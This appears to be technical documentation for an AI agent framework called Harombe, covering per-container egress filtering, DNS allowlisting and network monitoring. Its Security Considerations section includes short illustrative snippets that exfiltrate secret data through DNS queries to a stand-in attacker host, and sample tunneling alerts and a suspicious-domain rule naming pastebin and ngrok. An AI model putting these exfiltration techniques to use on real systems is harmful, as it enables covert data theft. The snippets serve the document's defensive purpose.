# Network Isolation and Egress Filtering

**Phase 4.4 - Per-Container Network Security for AI Agent Safety**

Network isolation is a critical security layer that prevents AI agents from exfiltrating sensitive data, accessing unauthorized resources, or being exploited by malicious actors. Harombe implements per-container egress filtering using Docker networks and iptables rules to create a zero-trust network environment.

## Table of Contents

1. [Overview](#overview)
2. [Architecture](#architecture)
3. [Configuration](#configuration)
4. [Usage Examples](#usage-examples)
5. [Monitoring and Alerts](#monitoring-and-alerts)
6. [Best Practices](#best-practices)
7. [Troubleshooting](#troubleshooting)
8. [Security Considerations](#security-considerations)

---

## Overview

### Why Network Isolation Matters for AI Agents

AI agents pose unique security risks when given network access:

1. **Data Exfiltration Risk**: A compromised or malicious agent could send sensitive data (API keys, customer data, source code) to external servers
2. **Lateral Movement**: Without network isolation, a compromised container could attack other containers or the host system
3. **Supply Chain Attacks**: Agents might be tricked into downloading malicious code or connecting to attacker-controlled servers
4. **Prompt Injection**: Malicious prompts could instruct agents to establish unauthorized network connections

**Example Attack Scenario:**

```
User: "Summarize this document and save it to my cloud storage"
Agent (compromised): Reads document → Sends to attacker.com → Saves to cloud
```

Without egress filtering, the agent can freely connect to `attacker.com`.

### Per-Container Egress Filtering Architecture

Harombe implements a **default-deny** network policy where:

- **Each container has its own isolated network namespace**
- **No outbound connections allowed by default**
- **Explicit allowlists define permitted destinations**
- **DNS resolution is controlled and logged**
- **All connection attempts are audited**

This follows the **principle of least privilege**: containers only get the minimum network access required for their function.

### How It Prevents Data Exfiltration

Network isolation prevents data exfiltration through multiple layers:

1. **Docker Network Isolation**: Containers cannot communicate with each other or the host without explicit configuration
2. **Egress Filtering**: iptables rules block all outbound traffic except to allowed domains/IPs
3. **DNS Filtering**: DNS queries are intercepted and validated against allowlists
4. **Connection Logging**: All connection attempts (allowed and blocked) are logged for analysis
5. **Anomaly Detection**: Unusual connection patterns trigger alerts

---

## Architecture

### Docker Network Topology

```
┌─────────────────────────────────────────────────────────────────┐
│ Host System (macOS/Linux)                                       │
│                                                                   │
│  ┌──────────────────────────────────────────────────────────┐  │
│  │ Docker Network: harombe-network (172.20.0.0/16)          │  │
│  │                                                            │  │
│  │  ┌──────────────┐   ┌──────────────┐   ┌──────────────┐ │  │
│  │  │ Gateway      │   │ Browser      │   │ Web Search   │ │  │
│  │  │ 172.20.0.2   │   │ 172.20.0.3   │   │ 172.20.0.4   │ │  │
│  │  │ :8100        │   │ :3000        │   │ :3003        │ │  │
│  │  │              │   │              │   │              │ │  │
│  │  │ Egress:      │   │ Egress:      │   │ Egress:      │ │  │
│  │  │ - None       │   │ - *.com      │   │ - api.serp   │ │  │
│  │  │              │   │ - *.org      │   │ - duckduck   │ │  │
│  │  └──────────────┘   └──────────────┘   └──────────────┘ │  │
│  │                                                            │  │
│  │  ┌──────────────┐   ┌──────────────┐                     │  │
│  │  │ Filesystem   │   │ Code Exec    │                     │  │
│  │  │ 172.20.0.5   │   │ 172.20.0.6   │                     │  │
│  │  │ :3001        │   │ :3002        │                     │  │
│  │  │              │   │              │                     │  │
│  │  │ Network:     │   │ Network:     │                     │  │
│  │  │ - DISABLED   │   │ - DISABLED   │                     │  │
│  │  └──────────────┘   └──────────────┘                     │  │
│  │                                                            │  │
│  └────────────────────────────────────────────────────────────┘ │
│                                                                   │
│  ┌──────────────────────────────────────────────────────────┐  │
│  │ iptables Filter Rules (per container)                     │  │
│  │                                                            │  │
│  │ Chain DOCKER-USER (policy DROP):                          │  │
│  │   - Allow container → allowed domains/IPs                │  │
│  │   - Allow container → DNS resolver (127.0.0.11)          │  │
│  │   - Allow container → gateway (172.20.0.2)               │  │
│  │   - Log and DROP all other traffic                        │  │
│  └──────────────────────────────────────────────────────────┘  │
│                                                                   │
│  ┌──────────────────────────────────────────────────────────┐  │
│  │ DNS Resolver (Docker embedded DNS: 127.0.0.11)            │  │
│  │   - Intercepts DNS queries                                │  │
│  │   - Validates against domain allowlist                    │  │
│  │   - Logs all queries                                      │  │
│  │   - Returns NXDOMAIN for blocked domains                  │  │
│  └──────────────────────────────────────────────────────────┘  │
└───────────────────────────────────────────────────────────────────┘
                              │
                              │ Internet Gateway
                              ▼
                    ┌──────────────────┐
                    │ Internet         │
                    │ (filtered egress)│
                    └──────────────────┘
```

### iptables Rule Chain

Each container gets its own iptables rules in the `DOCKER-USER` chain:

```bash
# Default policy: DROP all traffic
iptables -P FORWARD DROP

# Chain for container-specific rules
iptables -N HAROMBE_BROWSER
iptables -N HAROMBE_WEBSEARCH
iptables -N HAROMBE_FILESYSTEM

# Route traffic to appropriate chain
iptables -A DOCKER-USER -s 172.20.0.3 -j HAROMBE_BROWSER
iptables -A DOCKER-USER -s 172.20.0.4 -j HAROMBE_WEBSEARCH
iptables -A DOCKER-USER -s 172.20.0.5 -j HAROMBE_FILESYSTEM

# Example: Browser container rules
iptables -A HAROMBE_BROWSER -d 172.20.0.2 -j ACCEPT  # Gateway
iptables -A HAROMBE_BROWSER -d 127.0.0.11 -p udp --dport 53 -j ACCEPT  # DNS
iptables -A HAROMBE_BROWSER -d 0.0.0.0/0 -p tcp --dport 80 -j ACCEPT   # HTTP
iptables -A HAROMBE_BROWSER -d 0.0.0.0/0 -p tcp --dport 443 -j ACCEPT  # HTTPS
iptables -A HAROMBE_BROWSER -j LOG --log-prefix "[HAROMBE-BLOCKED] " --log-level 4
iptables -A HAROMBE_BROWSER -j DROP

# Example: Filesystem container (no network)
iptables -A HAROMBE_FILESYSTEM -d 172.20.0.2 -j ACCEPT  # Gateway only
iptables -A HAROMBE_FILESYSTEM -j LOG --log-prefix "[HAROMBE-BLOCKED] "
iptables -A HAROMBE_FILESYSTEM -j DROP
```

### DNS Resolution Flow

```
┌─────────────┐
│ Container   │
│ (Browser)   │
└──────┬──────┘
       │ 1. DNS query: example.com
       ▼
┌─────────────────────┐
│ Docker DNS Resolver │
│ 127.0.0.11:53       │
└──────┬──────────────┘
       │ 2. Check allowlist
       ▼
┌─────────────────────┐
│ DNS Allowlist       │
│ - *.com ✓           │
│ - *.org ✓           │
│ - attacker.xyz ✗    │
└──────┬──────────────┘
       │ 3a. Allowed: Forward to upstream DNS
       │ 3b. Blocked: Return NXDOMAIN
       ▼
┌─────────────────────┐
│ Audit Logger        │
│ Log query + result  │
└─────────────────────┘
       │
       ▼
┌─────────────────────┐
│ Container           │
│ Gets IP or error    │
└─────────────────────┘
```

### Integration with MCP Gateway

The MCP Gateway coordinates network policies:

```python
# Gateway configures network policies when starting containers
async def start_container(self, name: str, config: ContainerConfig):
    # 1. Start container
    container_id = await self.docker_manager.create_container(config)

    # 2. Get container IP
    container_ip = await self.docker_manager.get_ip(container_id)

    # 3. Apply iptables rules
    await self.network_manager.apply_egress_policy(
        container_ip=container_ip,
        allowed_domains=config.egress_allow,
        container_name=name
    )

    # 4. Start monitoring
    await self.network_monitor.watch_container(container_id)
```

---

## Configuration

### Defining Egress Policies in harombe.yaml

Network policies are defined per-container in the security configuration:

```yaml
security:
  enabled: true
  isolation: docker

  containers:
    browser:
      image: harombe/browser:latest
      enabled: true

      # Egress policy: list of allowed destinations
      egress_allow:
        # Exact domain match
        - "example.com"

        # Wildcard subdomain match
        - "*.github.com"
        - "*.googleapis.com"

        # IP address (CIDR notation)
        - "8.8.8.8/32"
        - "1.1.1.0/24"

        # IP range
        - "10.0.0.0/8"

      # Empty list = no network access
      # egress_allow: []

    filesystem:
      image: harombe/filesystem:latest
      enabled: true

      # Filesystem container: NO network access
      egress_allow: []

    code_exec:
      image: harombe/code-exec:latest
      enabled: true

      # Code execution: NO network by default
      egress_allow: []

      # Optional: Allow access to package registries
      # egress_allow:
      #   - "pypi.org"
      #   - "*.python.org"
      #   - "npmjs.com"
      #   - "*.npmjs.com"

    web_search:
      image: harombe/web-search:latest
      enabled: true

      # Web search: Only search API endpoints
      egress_allow:
        - "api.serpapi.com"
        - "duckduckgo.com"
        - "*.duckduckgo.com"
```

### Domain Allowlists

#### Wildcards

Wildcard patterns support subdomain matching:

```yaml
egress_allow:
  # Match all subdomains
  - "*.example.com" # ✓ api.example.com, www.example.com
    # ✗ example.com (root not included)

  # Match root and all subdomains
  - "example.com" # ✓ example.com
  - "*.example.com" # ✓ api.example.com

  # Match specific pattern
  - "*.s3.amazonaws.com" # ✓ bucket.s3.amazonaws.com
    # ✗ s3.amazonaws.com
    # ✗ ec2.amazonaws.com
```

#### Exact Matches

Use exact domain names for precise control:

```yaml
egress_allow:
  - "api.github.com" # Only this exact domain
  - "raw.githubusercontent.com"
```

### CIDR Blocks

Allow access to specific IP ranges:

```yaml
egress_allow:
  # Single IP
  - "8.8.8.8/32"

  # Class C network
  - "192.168.1.0/24"

  # Class B network
  - "10.0.0.0/16"

  # Private networks
  - "10.0.0.0/8" # RFC 1918
  - "172.16.0.0/12" # RFC 1918
  - "192.168.0.0/16" # RFC 1918
```

**Warning:** Be careful with broad CIDR ranges. Use the most specific range needed.

### Dynamic Policy Updates

Update egress policies at runtime without restarting containers:

```python
from harombe.security import NetworkManager

manager = NetworkManager()

# Add new allowed domain
await manager.add_egress_rule(
    container_name="browser",
    destination="cdn.example.com"
)

# Remove allowed domain
await manager.remove_egress_rule(
    container_name="browser",
    destination="old-cdn.example.com"
)

# Replace entire policy
await manager.update_egress_policy(
    container_name="browser",
    allowed_domains=[
        "*.github.com",
        "api.openai.com"
    ]
)
```

### Example Configurations for Common Tools

#### Web Browser Container

```yaml
browser:
  image: harombe/browser:latest
  egress_allow:
    # Allow most common TLDs
    - "*.com"
    - "*.org"
    - "*.net"
    - "*.edu"

    # Block known malicious/tracking domains
    # (handled by DNS filtering)

    # Allow CDNs
    - "*.cloudflare.com"
    - "*.cloudfront.net"
    - "*.akamaiedge.net"
```

#### Code Execution Container (with package access)

```yaml
code_exec:
  image: harombe/code-exec:latest
  egress_allow:
    # Python packages
    - "pypi.org"
    - "*.python.org"
    - "*.pythonhosted.org"

    # npm packages
    - "registry.npmjs.org"
    - "*.npmjs.com"

    # GitHub (for git clone)
    - "github.com"
    - "*.github.com"
    - "raw.githubusercontent.com"
```

#### Web Search Container

```yaml
web_search:
  image: harombe/web-search:latest
  egress_allow:
    # Search API
    - "api.serpapi.com"

    # Alternative: DuckDuckGo
    - "duckduckgo.com"
    - "api.duckduckgo.com"
```

#### Filesystem Container (no network)

```yaml
filesystem:
  image: harombe/filesystem:latest
  # No network access at all
  egress_allow: []

  # Or use network_mode: none in Docker
  network_mode: none
```

---

## Usage Examples

### Programmatic Usage (Python)

#### Initialize Network Manager

```python
from harombe.security import NetworkManager
from harombe.config import load_config

# Load configuration
config = load_config("harombe.yaml")

# Initialize network manager
network_manager = NetworkManager(config.security)

# Start network monitoring
await network_manager.start()
```

#### Configure Container Egress Policy

```python
from harombe.security import EgressPolicy

# Create egress policy
policy = EgressPolicy(
    container_name="browser",
    allowed_domains=[
        "*.example.com",
        "api.github.com"
    ],
    allowed_ips=[
        "8.8.8.8/32",
        "1.1.1.1/32"
    ],
    allow_dns=True,
    allow_gateway=True
)

# Apply policy
await network_manager.apply_policy(policy)
```

#### Query Connection Status

```python
# Check if destination is allowed
is_allowed = await network_manager.check_destination(
    container_name="browser",
    destination="example.com",
    port=443
)

if is_allowed:
    print("Connection allowed")
else:
    print("Connection blocked by egress policy")
```

### Container Configuration

#### Docker Compose

```yaml
services:
  browser:
    image: harombe/browser:latest
    networks:
      - harombe-network

    # Network configuration
    dns:
      - 127.0.0.11 # Docker embedded DNS

    # Security options
    security_opt:
      - no-new-privileges:true

    cap_drop:
      - ALL

    cap_add:
      - NET_BIND_SERVICE # If needed
```

#### Dockerfile

```dockerfile
FROM python:3.11-slim

# Install network tools for debugging
RUN apt-get update && apt-get install -y \
    curl \
    dnsutils \
    iputils-ping \
    net-tools \
    && rm -rf /var/lib/apt/lists/*

# Run as non-root user
RUN useradd -m -u 1000 harombe
USER harombe

# No special network configuration needed
# Egress filtering handled by host iptables
```

### Adding/Removing Rules Dynamically

#### Add Single Rule

```python
# Add new allowed domain
await network_manager.add_rule(
    container_name="browser",
    rule_type="domain",
    value="cdn.newsite.com"
)
```

#### Remove Single Rule

```python
# Remove allowed domain
await network_manager.remove_rule(
    container_name="browser",
    rule_type="domain",
    value="old-cdn.example.com"
)
```

#### Batch Update

```python
# Update multiple rules at once
await network_manager.batch_update(
    container_name="browser",
    add_domains=["new1.com", "new2.com"],
    remove_domains=["old1.com", "old2.com"],
    add_ips=["1.2.3.4/32"]
)
```

### Monitoring Connection Attempts

#### Real-time Monitoring

```python
# Subscribe to connection events
async def on_connection_attempt(event):
    print(f"Container: {event.container_name}")
    print(f"Destination: {event.destination}:{event.port}")
    print(f"Allowed: {event.allowed}")
    print(f"Rule matched: {event.rule_matched}")

# Register handler
network_manager.on_connection_attempt(on_connection_attempt)
```

#### Query Historical Data

```python
# Get connection history
connections = await network_manager.get_connection_history(
    container_name="browser",
    limit=100,
    blocked_only=True
)

for conn in connections:
    print(f"{conn.timestamp}: {conn.destination} - BLOCKED")
```

---

## Monitoring and Alerts

### Blocked Connection Logging

All blocked connections are logged to the audit database:

```python
# Audit log entry for blocked connection
{
    "timestamp": "2026-02-09T14:30:45.123Z",
    "event_type": "network_blocked",
    "container_name": "browser",
    "container_id": "abc123def456",
    "source_ip": "172.20.0.3",
    "destination": "attacker.com",
    "destination_ip": "1.2.3.4",
    "port": 443,
    "protocol": "tcp",
    "rule_matched": "default_deny",
    "dns_query": "attacker.com",
    "correlation_id": "req-12345"
}
```

### Suspicious Pattern Detection

The network monitor detects suspicious patterns:

#### Port Scanning Detection

```python
# Alert triggered when container attempts to connect to many ports
{
    "alert_type": "port_scan",
    "severity": "high",
    "container_name": "browser",
    "description": "Container attempted 50+ connections to different ports",
    "destinations": ["target.com:80", "target.com:443", "target.com:8080", ...],
    "time_window": "60s"
}
```

#### DNS Tunneling Detection

```python
# Alert triggered by unusual DNS query patterns
{
    "alert_type": "dns_tunneling",
    "severity": "critical",
    "container_name": "code_exec",
    "description": "Abnormally long DNS queries detected",
    "queries": [
        "aGVsbG8gd29ybGQ.attacker.com",  # Base64 encoded data
        "dGhpcyBpcyBkYXRh.attacker.com"
    ],
    "time_window": "60s"
}
```

#### Data Exfiltration Detection

```python
# Alert triggered by large data transfers
{
    "alert_type": "data_exfiltration",
    "severity": "critical",
    "container_name": "filesystem",
    "description": "Large data transfer detected",
    "destination": "unknown-server.com",
    "bytes_transferred": 104857600,  # 100 MB
    "duration": "120s"
}
```

### Network Metrics

Monitor network health and usage:

```python
# Get network metrics
metrics = await network_manager.get_metrics(container_name="browser")

print(f"Connections allowed: {metrics.connections_allowed}")
print(f"Connections blocked: {metrics.connections_blocked}")
print(f"DNS queries: {metrics.dns_queries}")
print(f"DNS blocked: {metrics.dns_blocked}")
print(f"Bytes sent: {metrics.bytes_sent}")
print(f"Bytes received: {metrics.bytes_received}")
```

#### Prometheus Metrics

Export metrics for Prometheus:

```
# HELP harombe_network_connections_total Total network connections
# TYPE harombe_network_connections_total counter
harombe_network_connections_total{container="browser",status="allowed"} 1523
harombe_network_connections_total{container="browser",status="blocked"} 12

# HELP harombe_network_bytes_total Total bytes transferred
# TYPE harombe_network_bytes_total counter
harombe_network_bytes_total{container="browser",direction="sent"} 524288
harombe_network_bytes_total{container="browser",direction="received"} 2097152

# HELP harombe_network_dns_queries_total Total DNS queries
# TYPE harombe_network_dns_queries_total counter
harombe_network_dns_queries_total{container="browser",status="allowed"} 450
harombe_network_dns_queries_total{container="browser",status="blocked"} 3
```

### Integration with Audit Logs

Network events are integrated with the main audit log:

```python
# Query audit logs for network events
from harombe.security import AuditLogger

audit = AuditLogger()

# Get all blocked connections in last hour
events = await audit.query(
    event_type="network_blocked",
    time_range="1h"
)

# Get suspicious DNS queries
events = await audit.query(
    event_type="dns_query",
    filter=lambda e: e.metadata.get("suspicious", False)
)
```

---

## Best Practices

### Principle of Least Privilege

1. **Start with zero access**: Begin with `egress_allow: []` and add only what's needed
2. **Use specific domains**: Prefer `api.example.com` over `*.example.com`
3. **Avoid wildcards**: Use wildcards only when necessary (CDNs, cloud services)
4. **Review regularly**: Audit egress rules quarterly and remove unused entries

```yaml
# ✗ BAD: Too permissive
egress_allow:
  - "*"  # Allow everything - defeats the purpose!

# ✗ BAD: Overly broad wildcards
egress_allow:
  - "*.com"  # Allows millions of domains

# ✓ GOOD: Specific domains
egress_allow:
  - "api.github.com"
  - "raw.githubusercontent.com"
  - "registry.npmjs.org"
```

### Allowlist Maintenance

#### Regular Review Process

1. **Monthly review**: Check audit logs for blocked connections
2. **Identify false positives**: Legitimate connections being blocked
3. **Update allowlist**: Add necessary domains
4. **Remove unused entries**: Clean up old rules

```bash
# Script to review blocked connections
harombe audit query --event-type=network_blocked --since=30d \
  | jq '.destination' \
  | sort | uniq -c | sort -rn
```

#### Documentation

Document why each domain is allowed:

```yaml
browser:
  egress_allow:
    # GitHub API - required for repo access
    - "api.github.com"

    # CDN for web assets - required for page rendering
    - "*.cloudflare.com"

    # Google Fonts - required for UI
    - "fonts.googleapis.com"
    - "fonts.gstatic.com"
```

### Testing Egress Policies

#### Test Before Deployment

```python
# Test egress policy before applying
from harombe.security import EgressPolicyTester

tester = EgressPolicyTester()

# Define test cases
test_cases = [
    ("api.github.com", 443, "should_allow"),
    ("attacker.com", 443, "should_block"),
    ("subdomain.github.com", 443, "should_allow"),  # Wildcard *.github.com
]

# Run tests
results = await tester.test_policy(
    container_name="browser",
    policy=my_policy,
    test_cases=test_cases
)

# Verify results
assert results.passed == len(test_cases)
```

#### Integration Tests

```python
# Integration test with real container
async def test_browser_egress():
    # Start container with policy
    container = await docker_manager.start_container(
        name="test-browser",
        config=browser_config
    )

    # Test allowed connection
    result = await container.exec(["curl", "-I", "https://example.com"])
    assert result.returncode == 0

    # Test blocked connection
    result = await container.exec(["curl", "-I", "https://blocked.com"])
    assert result.returncode != 0  # Should fail

    # Cleanup
    await docker_manager.stop_container("test-browser")
```

### Performance Optimization

#### Rule Optimization

```yaml
# ✗ BAD: Many similar rules
egress_allow:
  - "api1.example.com"
  - "api2.example.com"
  - "api3.example.com"
  - "api4.example.com"

# ✓ GOOD: Single wildcard rule
egress_allow:
  - "api*.example.com"  # or "*.example.com" if appropriate
```

#### DNS Caching

```yaml
# Enable DNS caching to reduce lookup overhead
network:
  dns_cache_ttl: 300 # 5 minutes
  dns_cache_size: 1000 # Max cached entries
```

#### Connection Pooling

```yaml
# Use connection pooling to reduce connection overhead
network:
  connection_pool_enabled: true
  connection_pool_size: 10
  keepalive_timeout: 60
```

---

## Troubleshooting

### Connection Blocked Unexpectedly

#### Symptom

Container cannot connect to a legitimate destination:

```
Container: browser
Error: Connection refused
Destination: api.example.com
```

#### Diagnosis

1. **Check audit logs**:

```bash
harombe audit query --event-type=network_blocked \
  --filter='destination=api.example.com' \
  --since=1h
```

2. **Check egress policy**:

```bash
harombe network policy show --container=browser
```

3. **Test DNS resolution**:

```bash
docker exec harombe-browser nslookup api.example.com
```

#### Solution

Add the domain to the allowlist:

```yaml
browser:
  egress_allow:
    - "api.example.com" # Add this line
```

Or dynamically:

```python
await network_manager.add_rule(
    container_name="browser",
    rule_type="domain",
    value="api.example.com"
)
```

### iptables Issues

#### Symptom

iptables rules not working or causing errors:

```
ERROR: iptables: Chain already exists
ERROR: Failed to apply egress policy
```

#### Diagnosis

1. **Check existing rules**:

```bash
sudo iptables -L DOCKER-USER -n -v
```

2. **Check for conflicts**:

```bash
# Look for duplicate chains
sudo iptables -L | grep HAROMBE
```

3. **Check Docker network**:

```bash
docker network inspect harombe-network
```

#### Solution

**Reset iptables rules**:

```bash
# Backup current rules
sudo iptables-save > /tmp/iptables-backup.txt

# Flush Harombe chains
sudo iptables -F HAROMBE_BROWSER
sudo iptables -F HAROMBE_WEBSEARCH

# Delete chains
sudo iptables -X HAROMBE_BROWSER
sudo iptables -X HAROMBE_WEBSEARCH

# Reapply policies
harombe network policy apply --all
```

**Check Docker daemon**:

```bash
# Restart Docker (will recreate DOCKER-USER chain)
sudo systemctl restart docker

# Verify
sudo iptables -L DOCKER-USER
```

### DNS Resolution Problems

#### Symptom

DNS queries failing or timing out:

```
Container: browser
Error: DNS lookup failed: api.example.com
```

#### Diagnosis

1. **Check DNS configuration**:

```bash
docker exec harombe-browser cat /etc/resolv.conf
```

Expected output:

```
nameserver 127.0.0.11
options ndots:0
```

2. **Test DNS resolution**:

```bash
docker exec harombe-browser nslookup example.com
```

3. **Check DNS logs**:

```bash
harombe audit query --event-type=dns_query \
  --filter='container=browser' \
  --since=1h
```

#### Solution

**Fix DNS configuration**:

```yaml
browser:
  dns:
    - 127.0.0.11 # Docker embedded DNS
  dns_search: []
  dns_opt:
    - ndots:0
```

**Allow DNS in iptables**:

```bash
# Check if DNS is allowed
sudo iptables -L HAROMBE_BROWSER -n -v | grep :53

# Add DNS rule if missing
sudo iptables -I HAROMBE_BROWSER -d 127.0.0.11 -p udp --dport 53 -j ACCEPT
```

**Test resolution**:

```bash
# From inside container
docker exec harombe-browser nslookup -timeout=5 example.com

# Expected: Successful resolution
# If fails: Check upstream DNS on host
```

### Performance Degradation

#### Symptom

Container network performance is slow:

```
Container: browser
Issue: High latency (500ms+ per request)
Normal latency: <50ms
```

#### Diagnosis

1. **Check iptables rule count**:

```bash
sudo iptables -L HAROMBE_BROWSER -n -v | wc -l
```

If >1000 rules: Optimize rules

2. **Check DNS cache hit rate**:

```python
metrics = await network_manager.get_dns_metrics()
cache_hit_rate = metrics.cache_hits / (metrics.cache_hits + metrics.cache_misses)
print(f"DNS cache hit rate: {cache_hit_rate:.2%}")
```

If <80%: Increase cache size

3. **Check connection reuse**:

```python
metrics = await network_manager.get_connection_metrics()
reuse_rate = metrics.reused_connections / metrics.total_connections
print(f"Connection reuse rate: {reuse_rate:.2%}")
```

If <50%: Enable connection pooling

#### Solution

**Optimize iptables rules**:

```bash
# Consolidate similar rules
# Before (slow):
iptables -A HAROMBE_BROWSER -d 1.2.3.4 -j ACCEPT
iptables -A HAROMBE_BROWSER -d 1.2.3.5 -j ACCEPT
# ... 1000 more rules

# After (fast):
iptables -A HAROMBE_BROWSER -d 1.2.3.0/24 -j ACCEPT
```

**Increase DNS cache**:

```yaml
network:
  dns_cache_size: 10000 # Increase from 1000
  dns_cache_ttl: 600 # 10 minutes
```

**Enable connection pooling**:

```yaml
network:
  connection_pool_enabled: true
  connection_pool_size: 50 # Increase pool size
```

---

## Security Considerations

### Limitations

#### IP-Based vs Domain-Based Filtering

**Domain-based filtering** (using DNS):

✓ Easy to configure and understand
✓ Works with CDNs and dynamic IPs
✗ Vulnerable to DNS rebinding attacks
✗ Can be bypassed with direct IP connections

**IP-based filtering** (using iptables):

✓ Cannot be bypassed (enforced at network layer)
✓ Works even if DNS is compromised
✗ Difficult to maintain (IPs change)
✗ Doesn't work with CDNs (many IPs)

**Harombe uses both**:

1. DNS filtering for user-friendly domain allowlists
2. IP-based iptables rules for enforcement
3. DNS resolver validates domains before resolution

#### Domain Shadowing and Typosquatting

Attackers may use similar domains:

```
Legitimate: api.github.com
Malicious:  api.github-com.attacker.xyz
            api-github.com
            ap1.github.com  (using digit 1 instead of letter i)
```

**Mitigation**:

- Use exact domain matches when possible
- Enable typo detection in DNS resolver
- Monitor DNS queries for suspicious patterns

### DNS Rebinding Attacks

#### Attack Scenario

1. Attacker registers `attack.com`
2. DNS initially resolves to public IP (1.2.3.4)
3. Container queries DNS, gets 1.2.3.4
4. DNS TTL expires
5. Attacker changes DNS to internal IP (172.20.0.2)
6. Container re-queries DNS, gets internal IP
7. Container now has access to internal network

#### Mitigation

```yaml
# Prevent DNS rebinding
network:
  dns_rebinding_protection: true

  # Block resolution to private IPs
  block_private_ips: true

  # Minimum DNS TTL (prevent rapid changes)
  min_dns_ttl: 60

  # Pin IPs for critical domains
  dns_pins:
    - domain: "api.github.com"
      ips:
        - "140.82.121.6"
```

**Implementation**:

```python
# DNS resolver checks for rebinding
async def resolve_domain(domain: str) -> str:
    ip = await upstream_resolver.resolve(domain)

    # Block private IPs
    if is_private_ip(ip):
        logger.warning(f"DNS rebinding attempt: {domain} -> {ip}")
        raise DNSError("Private IP blocked")

    # Check against pinned IPs
    if domain in dns_pins:
        if ip not in dns_pins[domain]:
            logger.warning(f"DNS pin violation: {domain} -> {ip}")
            raise DNSError("IP not in pin list")

    return ip
```

### IPv6 Support

**Current limitations**:

- Harombe network isolation primarily targets IPv4
- IPv6 may bypass iptables rules if not configured
- Docker IPv6 support requires additional setup

**Recommended configuration**:

```yaml
# Disable IPv6 in containers (unless needed)
services:
  browser:
    sysctls:
      - net.ipv6.conf.all.disable_ipv6=1
      - net.ipv6.conf.default.disable_ipv6=1
```

**If IPv6 is needed**:

```bash
# Add IPv6 iptables rules (ip6tables)
sudo ip6tables -A HAROMBE_BROWSER -d 2001:db8::/32 -j ACCEPT
sudo ip6tables -A HAROMBE_BROWSER -j DROP
```

### Container Escape Scenarios

Network isolation cannot protect against container escape vulnerabilities:

1. **Kernel exploits**: Attacker gains root on host
2. **Docker socket access**: Container with `/var/run/docker.sock` mounted
3. **Privileged containers**: Containers with `--privileged` flag

**Mitigation strategies**:

```yaml
# Security hardening
services:
  browser:
    # Drop all capabilities
    cap_drop:
      - ALL

    # Read-only root filesystem
    read_only: true

    # No new privileges
    security_opt:
      - no-new-privileges:true

    # User namespaces
    userns_mode: "host"

    # AppArmor/SELinux profile
    security_opt:
      - apparmor:harombe-browser-profile
```

**Additional protections**:

1. **Keep Docker updated**: Patch container runtime vulnerabilities
2. **Use gVisor or Kata Containers**: Enhanced isolation (Phase 4+)
3. **Monitor for suspicious activity**: Unusual syscalls, file access
4. **Principle of least privilege**: Minimal container capabilities

### Network Covert Channels

Attackers may attempt to bypass egress filtering through covert channels:

#### Timing-Based Channels

```python
# Attacker encodes data in DNS query timing
for bit in secret_data:
    if bit == 1:
        time.sleep(0.1)  # 100ms delay = bit 1
    else:
        time.sleep(0.05)  # 50ms delay = bit 0
    dns_query("exfil.attacker.com")
```

**Detection**: Monitor for unusual DNS query patterns

#### DNS Query Channels

```python
# Attacker encodes data in DNS queries
data = "secret_data"
encoded = base64.encode(data)
dns_query(f"{encoded}.exfil.attacker.com")
```

**Mitigation**:

- Monitor DNS query length (alert on >100 characters)
- Block base64-like patterns in DNS queries
- Rate limit DNS queries per container

```yaml
network:
  dns_query_max_length: 100
  dns_query_rate_limit: 100 # queries per minute
  dns_query_pattern_blocking: true
```

---

## Advanced Configuration

### Per-Tool Egress Policies

Different tools within the same container can have different policies:

```yaml
browser:
  egress_allow:
    # Default: Allow most websites
    - "*.com"
    - "*.org"

  # Override per tool
  tool_policies:
    browser_navigate:
      # Navigation: Full access
      inherit_default: true

    browser_screenshot:
      # Screenshots: No external requests
      egress_allow: []
```

### Time-Based Policies

Restrict network access by time:

```yaml
browser:
  egress_allow:
    - domain: "api.example.com"
      # Only during business hours (UTC)
      time_restriction:
        days: [Mon, Tue, Wed, Thu, Fri]
        hours: "09:00-17:00"
        timezone: "UTC"
```

### Rate Limiting

Prevent abuse and resource exhaustion:

```yaml
browser:
  rate_limits:
    # Limit connections per minute
    connections_per_minute: 1000

    # Limit bandwidth (bytes per second)
    bandwidth_limit: 10485760 # 10 MB/s

    # Limit DNS queries
    dns_queries_per_minute: 100
```

### Geo-Blocking

Block connections to specific countries:

```yaml
browser:
  geo_restrictions:
    # Block connections to these countries
    blocked_countries: [KP, IR, SY]

    # Or: Allow only these countries
    allowed_countries: [US, CA, GB, DE, FR]
```

---

## Integration Examples

### With Audit System

```python
# Audit logger automatically captures network events
from harombe.security import AuditLogger

audit = AuditLogger()

# Query network events
events = await audit.query(
    event_types=["network_blocked", "network_allowed"],
    container="browser",
    time_range="24h"
)

# Generate report
report = {
    "total_connections": len(events),
    "blocked": len([e for e in events if e.type == "network_blocked"]),
    "top_destinations": collections.Counter(
        e.destination for e in events
    ).most_common(10)
}
```

### With Alerting System

```python
# Configure alerts for suspicious network activity
from harombe.security import AlertManager

alerts = AlertManager()

# Alert on blocked connections to suspicious domains
alerts.add_rule(
    name="suspicious_domain",
    condition=lambda e: (
        e.event_type == "network_blocked" and
        any(suspicious in e.destination for suspicious in [
            "pastebin", "ngrok", "duckdns"
        ])
    ),
    severity="high",
    notification_channels=["email", "slack"]
)
```

### With HITL Gates

```python
# Require human approval for risky network access
from harombe.security import HITLGate

hitl = HITLGate()

# Define approval rules
@hitl.require_approval(
    condition=lambda req: (
        req.tool_name == "browser_navigate" and
        req.destination not in allowed_domains
    ),
    timeout=60
)
async def navigate(url: str):
    # Will block until human approval received
    return await browser.navigate(url)
```

---

## Summary

Network isolation is a critical security layer that:

1. **Prevents data exfiltration** by blocking unauthorized outbound connections
2. **Limits attack surface** by restricting container network access
3. **Provides visibility** through comprehensive connection logging
4. **Enables fine-grained control** with per-container egress policies

**Key takeaways**:

- Start with **zero access** and add only necessary destinations
- Use **specific domains** over broad wildcards
- **Monitor and alert** on blocked connections
- **Test policies** before deployment
- **Review regularly** and remove unused rules

**Next steps**:

1. Review the [Security Quick Start Guide](./security-quickstart.md)
2. Configure egress policies in `harombe.yaml`
3. Test policies in development
4. Monitor audit logs for blocked connections
5. Adjust policies based on legitimate traffic

For questions or issues, see [Troubleshooting](#troubleshooting) or open an issue on GitHub.

---

**Document Version:** 1.0
**Last Updated:** 2026-02-09
**Status:** Complete
